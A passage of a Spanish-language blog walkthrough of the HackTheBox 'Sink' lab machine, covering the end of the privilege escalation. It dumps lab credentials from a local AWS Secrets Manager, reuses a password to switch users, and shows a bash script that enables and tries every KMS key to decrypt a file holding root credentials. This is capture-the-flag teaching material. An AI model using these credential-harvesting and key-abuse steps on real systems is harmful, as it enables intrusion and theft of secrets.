+                ]
+            }
+        },
+        {
+            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR",
+            "Name": "Jira Support",
+            "Description": "Manage customer issues",
+            "KmsKeyId": "",
+            "RotationEnabled": false,
+            "RotationLambdaARN": "",
+            "RotationRules": {
+                "AutomaticallyAfterDays": 0
+            },
+            "Tags": [],
+            "SecretVersionsToStages": {
+                "b07ec8cf-4f71-41bb-b20b-023d874be8a9": [
+                    "AWSCURRENT"
+                ]
+            }
+        }
+    ]
+}
+</code></pre>
+
+<p>Obtenemos 3 plataformas:</p>
+
+<ul>
+  <li>Jenkins Login: Master Server to manage release cycle 1.</li>
+  <li>Sink Panel: A panel to manage the resources in the devnode.</li>
+  <li>Jira Support: Manage customer issues.</li>
+</ul>
+
+<p>Si intentamos ver alguna data en concreto (los secretos) podemos hacerlo usando el ID, que sería el valor <code>"ARN"</code>.</p>
+
+<p>Por ejemplo, veamos el valor secreto de <strong>Jenkins Login</strong> (<code>get-secret-value</code>):</p>
+
+<p>🛹 <strong><u>Jenkins Login</u></strong>.</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv",
+    "Name": "Jenkins Login",
+    "VersionId": "53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6",
+    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~Bj\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1614230338
+}
+</code></pre>
+
+<p>Opa, el valor secreto son unas credenciales:</p>
+
+<ul>
+  <li><code>john@sink.htb</code> : <code>R);\\)ShS99mZ~Bj</code> o <code>R);\)ShS99mZ~Bj</code></li>
+</ul>
+
+<p>Antes de ver si son funcionales, validemos con los otros 2 IDs para ver que tienen:</p>
+
+<p>🛹 <strong><u>Sink Panel</u></strong>.</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI",
+    "Name": "Sink Panel",
+    "VersionId": "97d47d9b-6e95-459e-a0b4-60411a9054d2",
+    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1614230338
+}
+</code></pre>
+
+<ul>
+  <li><code>albert@sink.htb</code> : <code>Welcome123!</code></li>
+</ul>
+
+<p>🛹 <strong><u>Jira Support</u></strong>.</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR"
+{
+    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR",
+    "Name": "Jira Support",
+    "VersionId": "b07ec8cf-4f71-41bb-b20b-023d874be8a9",
+    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EAL8=bcC=`a7f2#k\"}",
+    "VersionStages": [
+        "AWSCURRENT"
+    ],
+    "CreatedDate": 1614230338
+}
+</code></pre>
+
+<ul>
+  <li><code>david@sink.htb</code> : <code>EAL8=bcC=</code>a7f2#k`</li>
+</ul>
+
+<p>Acá <code>david</code> es interesante porque lo tenemos presente como usuario de <code>Gitea</code> y también como usuario de la propia máquina. Validemos en el panel login de <code>Gitea</code> estas credenciales:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_david_dashboard.png" alt="313page3000_david_dashboard" /></p>
+
+<p>Son funcionales. Probemos si podemos hacer reutilización de contraseñas e intentemos migrarnos a <code>david</code> pero desde el sistema:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ su david
+Password: 
+david@sink:/home/marcus$ whoami
+david
+david@sink:/home/marcus$ id
+uid=1000(david) gid=1000(david) groups=1000(david)
+david@sink:/home/marcus$ 
+</code></pre>
+
+<p><strong>Perfectoooooooooooooooooooooooooooooooooooo, somos <code>david</code> ahora (:</strong></p>
+
+<p>Antes, veamos si hay algo importante usando <code>kms</code> con <code>AWS CLI</code>:</p>
+
+<pre><code class="language-bash">marcus@sink:~$ aws --endpoint-url=http://localhost:4566 kms list-keys
+{
+    "Keys": [
+        { 
+            "KeyId": "0b539917-5eff-45b2-9fa1-e13f0d2c42ac",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac"
+        },
+        { 
+            "KeyId": "16754494-4333-4f77-ad4c-d0b73d799939",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939"
+        },
+        { 
+            "KeyId": "2378914f-ea22-47af-8b0c-8252ef09cd5f",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f"
+        },
+        { 
+            "KeyId": "2bf9c582-eed7-482f-bfb6-2e4e7eb88b78",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78"
+        },
+        { 
+            "KeyId": "53bb45ef-bf96-47b2-a423-74d9b89a297a",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a"
+        },
+        { 
+            "KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0"
+        },
+        { 
+            "KeyId": "837a2f6e-e64c-45bc-a7aa-efa56a550401",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401"
+        },
+        { 
+            "KeyId": "881df7e3-fb6f-4c7b-9195-7f210e79e525",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525"
+        },
+        {
+            "KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde"
+        },
+        {
+            "KeyId": "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
+        },
+        {
+            "KeyId": "f2358fef-e813-4c59-87c8-70e50f6d4f70",
+            "KeyArn": "arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70"
+        }
+    ]
+}
+</code></pre>
+
+<p>Tenemos unas <strong>keys</strong>, no sé si sean relevantes, pero pues para tenerlas en cuenta, de los otros parámetros no podemos obtener algo. Sigamos…</p>
+
+<p>…</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h1>
+
+<p>En el <code>/home</code> de <code>david</code> tenemos un par de carpetas que nos llevan a un objeto<code>.enc</code>:</p>
+
+<pre><code class="language-bash">david@sink:~$ ls
+Projects
+david@sink:~$ cd Projects/
+david@sink:~/Projects$ ls
+Prod_Deployment
+david@sink:~/Projects$ cd Prod_Deployment/
+david@sink:~/Projects/Prod_Deployment$ ls
+servers.enc
+david@sink:~/Projects/Prod_Deployment$ file servers.enc 
+servers.enc: data
+</code></pre>
+
+<p>Intentando crackearlo no hacemos nada :P Veamos que podemos relacionar para leer el archivo.</p>
+
+<p>Bueno, buscando encontramos como se pudo haber generado el archivo mediante <code>aws</code>:</p>
+
+<ul>
+  <li><a href="https://aws.amazon.com/blogs/security/how-to-encrypt-and-decrypt-your-data-with-the-aws-encryption-cli/">How to encrypt and decrypt with <strong>AWS CLI</strong></a>.</li>
+</ul>
+
+<p>Podemos ver que para generar el archivo se usa un <code>keyId</code> yyyyyyy anteriormente encontramos varios <code>keyId</code>s. <strong>Tengamos esto presente</strong>…</p>
+
+<p>No contamos con <code>aw, pero mediante </code>kms<code> tenemos varias funciones para jugar con los </code>keyId`, una llamada <a href="https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html">decrypt</a>:</p>
+
+<ul>
+  <li><a href="https://docs.aws.amazon.com/cli/latest/reference/kms/decrypt.html">AWS CLI <strong>kms decrypt</strong></a>.</li>
+</ul>
+
+<p>Entonces, según la documentación el argumento obligatorio seria:</p>
+
+<ul>
+  <li><code>--ciphertext-blob fileb://</code>: Que ahí le indicamos la ruta del archivo <code>.enc</code></li>
+</ul>
+
+<p>Podemos intentar desencriptar el archivo <code>servers.enc</code>:</p>
+
+<pre><code class="language-bash"># Con ruta absoluta:
+david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb://home/david/Projects/Prod_Deployment/servers.enc 
+
+Error parsing parameter '--ciphertext-blob': Unable to load paramfile fileb://home/david/Projects/Prod_Deployment/servers.enc: [Errno 2] No such file or directory: 'home/david/Projects/Prod_Deployment/servers.enc'
+</code></pre>
+
+<pre><code class="language-bash"># Escapando la ruta absoluta:
+david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 
+
+An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access.
+</code></pre>
+
+<p>Pero nada, solo vemos errores, entiendo que debemos indicarle la <code>keyId</code>, elijamos cualquiera y veamos que sucede:</p>
+
+<pre><code class="language-bash">david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc" --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 
+
+An error occurred (DisabledException) when calling the Decrypt operation: f0579746-10c3-4fd1-b2ab-f312a5a0f3fc is disabled.
+</code></pre>
+
+<p>Nos indica que la operación <code>Decrypt</code> esta inhabilitada para esa <code>key</code>, leyendo de nuevo la doc de <strong>kms</strong> hay un argumento para habilitar una <code>key</code>, probemos a ver si de eso se trata el error:</p>
+
+<pre><code class="language-bash"># Habilitamos
+david@sink:~$ aws --endpoint-url=http://localhost:4566 kms enable-key --key-id "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc"
+
+# Ejecutamos de nuevo
+david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id "f0579746-10c3-4fd1-b2ab-f312a5a0f3fc" --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc 
+
+An error occurred (InvalidCiphertextException) when calling the Decrypt operation: 
+</code></pre>
+
+<p>Obtenemos un error diferente, relacionado posiblemente a la desencriptación en concreto (<code> Invalid Ciphertext</code>) o quizás a que esa <code>key</code> no es la necesaria para ese archivo…</p>
+
+<p>Creémonos un script para que nos valide con todas las keys.</p>
+
+<p>Las extraemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_listkeys_grep_cut.png" alt="313bash_davidSH_listkeys_grep_cut" /></p>
+
+<p>En el script las guardaremos en un archivo temporal para ir leyendo cada una, ahora si hagamos el archivo:</p>
+
+<ul>
+  <li>Agregaremos los argumentos <code>--output text</code> y <code>--query Plaintext</code> (<strong><em>These parameters extract the decrypted data, called the plaintext, from the command’s output.</em></strong>)</li>
+</ul>
+
+<hr />
+
+<pre><code class="language-bash">#!/bin/bash
+
+# Generamos el archivo con las keys
+aws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d '"' -f 4 &gt; keys.tmp
+file_with_keys=./keys.tmp
+
+while read keyId; do  # Tomamos cada llave del archivo
+    # Habilitamos la llave
+    aws --endpoint-url=http://localhost:4566 kms enable-key --key-id "$keyId" 2&gt;/dev/null
+
+    echo -ne "\n$keyId:"
+    # Desencriptamos el archivo servers.enc
+    aws --endpoint-url=http://localhost:4566 kms decrypt --key-id "$keyId" --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext
+done &lt; $file_with_keys
+
+shred -zun 10 $file_with_keys
+</code></pre>
+
+<p>Pero no obtenemos nada…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_valkeria_fail.png" alt="313bash_davidSH_valkeria_fail" /></p>
+
+<p>Probemos a jugar con los métodos de encriptación:</p>
+
+<pre><code class="language-html">&gt; Specifies the encryption algorithm that will be used to decrypt the ciphertext.
+&gt;&gt; Possible values:
+&gt;&gt;
+&gt;&gt;    SYMMETRIC_DEFAULT
+&gt;&gt;    RSAES_OAEP_SHA_1
+&gt;&gt;    RSAES_OAEP_SHA_256
+</code></pre>
+
+<p>Entonces adecuando esto a nuestro script quedaría:</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+# Generamos el archivo con las keys
+aws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d '"' -f 4 &gt; keys.tmp
+file_with_keys=./keys.tmp
+types_algorithms=( SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256 )
+
+while read keyId; do
+    echo -e "\n[+] Llave: $keyId:"
+    for algorithm in "${types_algorithms[@]}"; do # Tomamos cada algoritmo del array y probamos
+        echo -ne "[*] Algoritmo: $algorithm"
+
+        # Habilitamos la llave
+        aws --endpoint-url=http://localhost:4566 kms enable-key --key-id "$keyId" 2&gt;/dev/null
+
+        # Desencriptamos el archivo servers.enc
+        aws --endpoint-url=http://localhost:4566 kms decrypt --key-id "$keyId" --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers.enc --output text --query Plaintext --encryption-algorithm $algorithm
+    done
+done &lt; $file_with_keys
+
+shred -zun 10 $file_with_keys
+</code></pre>
+
+<p>Ejecutamos yyyy:</p>
+
+<pre><code class="language-bash">david@sink:/dev/shm/testest$ ./valkeria.sh
+
+[+] Llave: 0b539917-5eff-45b2-9fa1-e13f0d2c42ac:
+[*] Algoritmo: SYMMETRIC_DEFAULT
+
+An error occurred (InvalidCiphertextException) when calling the Decrypt operation: 
+[*] Algoritmo: RSAES_OAEP_SHA_1
+
+An error occurred (InvalidCiphertextException) when calling the Decrypt operation:
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_davidSH_valkeria_done.png" alt="313bash_davidSH_valkeria_done" /></p>
+
+<p>Opaaaaaaa, logramos desencriptar el archivo y ver el contenido, tenemos una cadena en <code>base64</code>:</p>
+
+<ul>
+  <li>La llave: <code>804125db-bdf1-465a-a058-07fc87c0fad0</code>.</li>
+  <li>El tipo de algoritmo: <code>RSAES_OAEP_SHA_256</code>.</li>
+</ul>
+
+<p>Si intentamos decodear esa string obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_tryingdecodebase64stringwithecho.png" alt="313bash_tryingdecodebase64stringwithecho" /></p>
+
+<p>No obtenemos nada legible, pero de una vez pensé en que posiblemente sea data de algún archivo, entonces tomemos el resultado del decode y guardémoslo en un archivo y veamos que tipo de archivo es:</p>
+
+<pre><code class="language-bash">...
+glEwRAEATgL7TAAoAAA=" | base64 -d &gt; result_b64
+</code></pre>
+
+<pre><code class="language-bash">❭ file result_b64 
+result_b64: gzip compressed data, from Unix, original size modulo 2^32 10240
+</code></pre>
+
+<p>Bien, un archivo comprimido, descomprimámoslo:</p>
+
+<pre><code class="language-bash">❭ gzip -d result_b64
+gzip: result_b64: unknown suffix -- ignored
+</code></pre>
+
+<p>Jmmm, buscando en internet sobre este error, encontramos un foro donde alguien recomienda usar <code>zcat</code>:</p>
+
+<ul>
+  <li><a href="https://www.linuxquestions.org/questions/linux-software-2/gunzip-unknown-suffix-ignored-940698/">Try to use <strong>zcat</strong></a>.</li>
+</ul>
+
+<p>¿Pero por qué <code>zcat</code>?</p>
+
+<p>📁 <strong><em>Normalmente, los archivos comprimidos con <code>gzip</code> se pueden restaurar a su forma original con los comandos <code>gzip -d</code> o <code>gunzip</code>. ¿<u>Qué sucede si desea ver el contenido de un archivo comprimido sin descomprimirlo</u>? Para este propósito, necesita la utilidad <code>zcat</code></em></strong>. <a href="https://es.linux-console.net/?p=243">linux-console</a></p>
+
+<p>📂 <strong><em><code>zcat</code> will uncompress files that have the correct magic number whether they have a <code>.gz</code> suffix or <u>not</u></em></strong>. <a href="https://www.linuxquestions.org/questions/linux-software-2/gunzip-unknown-suffix-ignored-940698/#post4657625">linuxquestions.org</a></p>
+
+<p>Entonces, si probamos ahora con <code>zcat</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313bash_zcatdecompress_done.png" alt="313bash_zcatdecompress_done" /></p>
+
+<p>Eaaa, tenemos un archivo <code>.yml</code>, donde en su contenido nos encontramos con unas credenciales del usuario <code>admin</code>. Probémoslas contra el usuario <code>root</code> en la máquina:</p>
+
+<pre><code class="language-bash">david@sink:/dev/shm/testest$ su root
+Password: 
+root@sink:/dev/shm/testest# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>Somos <strong>roooooooooooooooooooooooooooooooooooooooot</strong> (bueno, veamos si realmente lo somos):</p>
+
+<pre><code class="language-bash">root@sink:/dev/shm/testest# cd
+root@sink:~# ls
+automation  desync  docker-compose.yml  root.txt  snap
+</code></pre>
+
+<p>SÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ somos administradores del sistemaaaaaaaaa (:</p>
+
+<p>Solo nos quedaría ver las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313flags.png" alt="313flags" /></p>
+
+<p>…</p>
+
+<p>¡Qué locura eh!</p>
+
+<p>Me gusto demasiado la máquina (: Lo que más me dejo loco fue el <code>HTTP Request Smuggling</code>.</p>
+
+<p>Que bonito fue este camino. el jugar con <code>aws</code> de esa manera, increíble. Y nada, como siempre, muchas gracias por leer (este si fue gigante)…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313google_gif_youarethebestTED.gif" style="display: block; margin-left: auto; margin-right: auto; width: 50%;" /></p>
+
+<p>Yyyy a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Sink&url=http://localhost:4000/htb/sink" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#.enc">.enc</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#AWS-CLI">AWS-CLI</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#HTTP-request-smuggling">HTTP-request-smuggling</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cookie-hijacking">cookie-hijacking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#gitea">gitea</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/breadcrumbs">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/breadcrumbs/316banner.png" alt="HackTheBox - Breadcrumbs"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/breadcrumbs">HackTheBox - Breadcrumbs</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil. Jugaremos mucho con inyecciones y robos :P Encontraremos un LFI, haremos cookie-hijacking, leeremos contraseñas almacenadas, jugando con binarios encontramos una URL que nos llevara de la...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">17 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bucket">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png" alt="HackTheBox - Bucket"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bucket">HackTheBox - Bucket</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio, jugaremos mucho con AWS, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta PD4ML y AWS DynamoDB....</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">23 Apr 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
